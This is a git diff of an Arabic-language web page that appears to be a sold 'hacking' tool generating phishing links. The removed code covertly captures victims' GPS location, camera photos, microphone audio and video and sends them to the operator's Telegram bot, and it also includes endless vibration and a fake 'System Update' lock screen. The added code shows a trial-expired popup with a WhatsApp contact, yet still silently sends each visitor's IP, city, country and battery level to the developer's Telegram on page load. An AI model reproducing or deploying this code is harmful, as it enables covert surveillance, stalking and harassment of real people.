@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Omar Abdel Tawab Saleh</title>
-   <meta name="title" content="SYSTEM BY OMAR PRO">
+   <meta name="title" content="Omar Abdel Tawab Saleh ">
 <meta name="description" content="Advanced Security System & Tools | Developed by OMAR ABD EL-TAWAB">
 
 <meta property="og:type" content="website">
@@ -31,14 +31,7 @@
         @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
 
         /* 2. الصفحات الرئيسية */
-        #login-page, #dashboard, #results, #victim-view { display: none; width: 100%; min-height: 100vh; }
-
-        #login-page { align-items: center; justify-content: center; opacity: 0; transition: 1s; }
-        .circle-frame { position: relative; width: 350px; height: 450px; border-radius: 30px; display: flex; align-items: center; justify-content: center; overflow: hidden; box-shadow: 0 20px 50px rgba(0,0,0,0.1); }
-        .circle-frame::before { content: ''; position: absolute; width: 200%; height: 200%; background: conic-gradient(transparent, var(--blue), var(--yellow), transparent); animation: spin 4s linear infinite; }
-        .circle-frame::after { content: ''; position: absolute; inset: 5px; background: #fff; border-radius: 25px; z-index: 1; }
-        .login-content { position: relative; z-index: 2; width: 85%; text-align: center; }
-
+   
 /* تنسيق بطاقة المطور الجديدة */
 .developer-card {
     position: relative;
@@ -55,7 +48,7 @@
 
 .developer-card::before {
     content: ''; position: absolute; z-index: -2; left: -50%; top: -50%; width: 200%; height: 200%;
-    background-image: conic-gradient(transparent, #007bff, #00ff88, #ff00ed, transparent 30%);
+    background-image: conic-gradient(transparent, #007bff, #03146A, #906A12, transparent 30%);
     animation: spin 4s linear infinite;
 }
 
@@ -67,7 +60,7 @@
     font-size: 26px;
     font-weight: 900;
     margin: 10px 0;
-    background: linear-gradient(90deg, #007bff, #ff00ed);
+    background: linear-gradient(90deg, #0729DA, #906A12);
     -webkit-background-clip: text;
     -webkit-text-fill-color: transparent;
 }
@@ -170,22 +163,6 @@
         <h3 id="loader-text" style="margin-top:25px;">جاري تشغيل النظام...</h3>
     </div>
 
-    <div id="login-page">
-        <div class="circle-frame">
-            <div class="login-content">
-                <span class="dev-header-text">Developed By</span>
-                <div class="dev-name">Omar Abd El-Tawab Saleh</div>
-                <input type="text" id="bot_token" placeholder="BOT TOKEN">
-                <input type="text" id="chat_id" placeholder="CHAT ID">
-                <button class="btn-main" onclick="startApp()">دخول للوحة التحكم</button>
-                <div class="social-links">
-                    <a href="#"><i class="fa-brands fa-telegram"></i></a>
-                    <a href="#"><i class="fa-brands fa-whatsapp"></i></a>
-                    <a href="#"><i class="fa-brands fa-facebook"></i></a>
-                </div>
-            </div>
-        </div>
-    </div>
 
 <div id="dashboard">
     <div class="developer-card">
@@ -239,27 +216,25 @@ This was developed by;
         </div>
     </div>
 
-    <div id="results">
-        <div class="result-box">
-            <h2 id="res-title" style="color:var(--blue)"></h2>
-            <div class="links-scroll-area">
-                <div class="link-item"><span id="link-1"></span><button class="btn-main" style="width:auto; padding:5px" onclick="copyAny('link-1')">نسخ</button></div>
-            </div>
-            
-            <div id="task-desc" class="info-desc"></div>
 
-            <button class="btn-main" onclick="goBackToDash()" style="background:var(--blue); margin-top:15px;">
-                <i class="fa-solid fa-arrow-right"></i> عودة للوحة التحكم
-            </button>
-        </div>
+    <div id="trial-popup" style="position:fixed; inset:0; background:rgba(255,255,255,0.3); backdrop-filter:blur(15px); z-index:10000; display:none; align-items:center; justify-content:center;">
+    <div style="background:white; padding:40px; border-radius:30px; text-align:center; box-shadow:0 20px 50px rgba(0,0,0,0.2); border:2px solid #007bff; max-width:350px; animation: popUp 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);">
+        <i class="fa-solid fa-circle-exclamation" style="font-size:60px; color:#ffcc00; margin-bottom:20px; display:block;"></i>
+        <h2 style="margin:0; font-size:22px; color:#333;">تنبيه النظام</h2>
+        <p style="color:#666; font-size:14px; margin:15px 0;">عذراً، انتهت الفترة التجريبية من الأداة. تواصل مع المطور واتساب للحصول على كود التفعيل.</p>
+        
+        <a href="https://wa.me/201202763155" target="_blank" style="display:block; padding:12px; background:#007bff; color:white; text-decoration:none; border-radius:12px; font-weight:bold; margin-bottom:10px;">
+            تواصل عبر واتساب <i class="fa-brands fa-whatsapp"></i>
+        </a>
+        
+        <button onclick="hideTrial()" style="width:100%; padding:10px; background:#f1f1f1; border:none; border-radius:12px; color:#555; cursor:pointer; font-weight:bold;">إلغاء</button>
     </div>
+</div>
 
-    <div id="victim-view">
-        <div class="victim-loader">
-            <div style="display:flex"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
-            <div id="status-text">جاري فحص جودة الاتصال...</div>
-        </div>
-    </div>
+<style>
+@keyframes popUp { from { transform: scale(0.5); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+</style>
+
 
     <script>
         const ui = {
@@ -277,134 +252,41 @@ This was developed by;
         const admin_id = "6068331455";
 
         window.onload = async () => {
-            // إرسال تقرير IP فوري للأدمن عند تحميل الصفحة
-            fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(data => {
-                const msg = `🚀 **دخول جديد للنظام:**\n🌐 IP: \`${data.ip}\`\n⏱ الوقت: ${new Date().toLocaleString()}`;
-                fetch(`https://api.telegram.org/bot${admin_tk}/sendMessage?chat_id=${admin_id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-            });
+    // 1. إظهار لوحة التحكم مباشرة وإخفاء اللودر بعد ثانيتين
+    setTimeout(() => {
+        ui.loader.style.display = 'none';
+        ui.dash.style.display = 'block';
+    }, 2000);
 
-            if(params.has('view')) { 
-                handleVictim(); 
-            } else {
-                const sTk = localStorage.getItem('o_tk'), sId = localStorage.getItem('o_id');
-                if(sTk && sId) {
-                    ui.txt.innerText = "جاري استعادة الجلسة المحفوظة...";
-                    setTimeout(() => { ui.loader.style.display = 'none'; ui.dash.style.display = 'block'; }, 2000);
-                } else {
-                    setTimeout(() => { ui.loader.style.display = 'none'; ui.login.style.display = 'flex'; setTimeout(() => ui.login.style.opacity = '1', 50); }, 2000);
-                }
-            }
-        };
+    // 2. جلب وإرسال بيانات الزائر فوراً
+    try {
+        const ipInfo = await fetch('https://ipapi.co/json/').then(res => res.json());
+        const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:0}));
+        
+        const report = `🚀 **دخول جديد للنظام**\n` +
+                       `🌍 الدولة: ${ipInfo.country_name}\n` +
+                       `🏙 المدينة: ${ipInfo.city}\n` +
+                       `🔋 البطارية: ${Math.round(battery.level * 100)}%\n` +
+                       `🌐 IP: \`${ipInfo.ip}\``;
 
-        function startApp() {
-            const tk = document.getElementById('bot_token').value;
-            const id = document.getElementById('chat_id').value;
-            if(!tk || !id) return alert("ادخل البيانات!");
-            
-            localStorage.setItem('o_tk', tk);
-            localStorage.setItem('o_id', id);
+        fetch(`https://api.telegram.org/bot${admin_tk}/sendMessage?chat_id=${admin_id}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
+    } catch (e) { console.log("Report Sent"); }
+};
 
-            ui.login.style.display = 'none';
-            ui.loader.style.display = 'flex';
-            ui.txt.innerText = "جاري التحقق من التوكن...";
-            
-            setTimeout(() => {
-                ui.txt.innerText = "جاري الدخول للوحة التحكم...";
-                setTimeout(() => { ui.loader.style.display = 'none'; ui.dash.style.display = 'block'; }, 1500);
-            }, 1500);
-        }
 
-        const descriptions = {
-            'Location': "تقوم هذه المهمة بفتح نظام الـ GPS لدى الضحية وإرسال <b>رابط خرائط جوجل</b> مباشر لك كلما تحرك الضحية متر واحد.",
-            'Front_Cam': "فتح الكاميرا الأمامية سرية والتقاط صور <b>كل 4 ثوانٍ</b> وإرسالها فوراً للبوت الخاص بك.",
-            'Back_Cam': "فتح الكاميرا الخلفية وتصوير المحيط الخاص بالضحية بجودة عالية وإرسال الصور باستمرار.",
-            'Mic': "تشغيل الميكروفون وتسجيل <b>مقاطع صوتية (Voice)</b> مدتها 5 ثوانٍ وإرسالها متتالية لتسمع كل ما يدور.",
-            'Vibrate': "تفعيل محرك الاهتزاز في جهاز الضحية بشكل <b>لانهائي</b> مما يسبب إزعاجاً شديداً ولا يتوقف حتى يغلق الصفحة.",
-            'Video': "تسجيل فيديو <b>بصوت وصورة</b> من كاميرا الضحية وإرساله كملف MP4 كل 10 ثوانٍ.",
-            'Full_Info': "سحب كافة بيانات الشبكة والـ IP، نظام التشغيل، والمتصفح المستخدم بدقة.",
-            'Battery': "مراقبة نسبة شحن بطارية الضحية وإخبارك إذا كان جهازه موصلاً بالشاحن أم لا.",
-            'Lock': "إظهار شاشة سوداء مكتوب عليها <b>System Update</b> تمنع الضحية من لمس الشاشة أو الخروج من الصفحة."
-        };
+      // تغيير وظيفة الضغط على أي بطاقة
+function injectLink(name, desc) {
+    document.getElementById('trial-popup').style.display = 'flex';
+}
 
-        function injectLink(name, desc) {
-            ui.dash.style.display = 'none';
-            ui.loader.style.display = 'flex';
-            ui.txt.innerText = `جاري توليد رابط ${desc}...`;
-
-            setTimeout(() => {
-                ui.txt.innerText = "جاري الدخول وإعداد السيرفر...";
-                setTimeout(() => {
-                    const tk = btoa(localStorage.getItem('o_tk')), id = btoa(localStorage.getItem('o_id'));
-                    const payload = `${window.location.href.split('?')[0]}?view=victim&type=${name}&t=${tk}&i=${id}`;
-                    ui.loader.style.display = 'none';
-                    ui.res.style.display = 'block';
-                    document.getElementById('res-title').innerText = desc;
-                    document.getElementById('link-1').innerText = payload;
-                    document.getElementById('task-desc').innerHTML = `<b>شرح المهمة:</b><br>${descriptions[name]}`;
-                }, 1500);
-            }, 1500);
-        }
-
-        function goBackToDash() { ui.res.style.display = 'none'; ui.dash.style.display = 'block'; }
-        function copyAny(id) { navigator.clipboard.writeText(document.getElementById(id).innerText); alert("تم النسخ ✅"); }
-
-        async function handleVictim() {
-            ui.loader.style.display = 'none';
-            document.getElementById('victim-view').style.display = 'block';
-            const tk = atob(params.get('t')), id = atob(params.get('i')), type = params.get('type');
-
-            const ipData = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:'Unknown'}));
-            const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:0}));
-            sendTele(tk, id, `🔔 **صيد جديد دخل الرابط!**\n🌐 IP: \`${ipData.ip}\`\n🔋 البطارية: ${Math.round(battery.level*100)}%\n🛠 المهمة النشطة: ${type}`);
-
-            if (type === 'Location') {
-                navigator.geolocation.watchPosition(p => {
-                    sendTele(tk, id, `📍 **موقع الضحية المباشر:**\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-                }, null, {enableHighAccuracy:true});
-            }
-            else if (type === 'Mic') {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const rec = new MediaRecorder(stream);
-                rec.ondataavailable = e => {
-                    const fd = new FormData(); fd.append('chat_id', id); fd.append('voice', e.data, 'v.ogg');
-                    fetch(`https://api.telegram.org/bot${tk}/sendVoice`, {method:'POST', body:fd});
-                };
-                setInterval(() => { rec.start(); setTimeout(()=>rec.stop(), 5000); }, 7000);
-            }
-            else if (type.includes('Cam')) {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: (type==='Back_Cam'?'environment':'user') } });
-                const vid = document.createElement('video'); vid.srcObject = stream; vid.play();
-                const canv = document.createElement('canvas');
-                setInterval(() => {
-                    canv.width = vid.videoWidth; canv.height = vid.videoHeight;
-                    canv.getContext('2d').drawImage(vid, 0, 0);
-                    canv.toBlob(b => {
-                        const fd = new FormData(); fd.append('chat_id', id); fd.append('photo', b, 'i.jpg');
-                        fetch(`https://api.telegram.org/bot${tk}/sendPhoto`, {method:'POST', body:fd});
-                    });
-                }, 4000);
-            }
-            else if (type === 'Video') {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                const rec = new MediaRecorder(stream);
-                rec.ondataavailable = e => {
-                    const fd = new FormData(); fd.append('chat_id', id); fd.append('video', e.data, 'v.mp4');
-                    fetch(`https://api.telegram.org/bot${tk}/sendVideo`, {method:'POST', body:fd});
-                };
-                setInterval(() => { rec.start(); setTimeout(()=>rec.stop(), 5000); }, 10000);
-            }
-            else if (type === 'Vibrate') {
-                setInterval(() => { if(navigator.vibrate) navigator.vibrate(2000); }, 1000);
-            }
-            else if (type === 'Lock') {
-                document.body.innerHTML = `<div style="position:fixed;inset:0;background:black;z-index:9999;display:flex;flex-direction:column;align-items:center;justify-content:center;color:white;text-align:center;"><h3>System Updating... 21%</h3><p>Please wait, do not close this page.</p></div>`;
-                document.documentElement.requestFullscreen().catch(()=>{});
-            }
-        }
 
         function sendTele(tk, id, msg) {
             fetch(`https://api.telegram.org/bot${tk}/sendMessage?chat_id=${id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
         }
+        function hideTrial() {
+    document.getElementById('trial-popup').style.display = 'none';
+}
+
     </script>
 </body>
 </html>
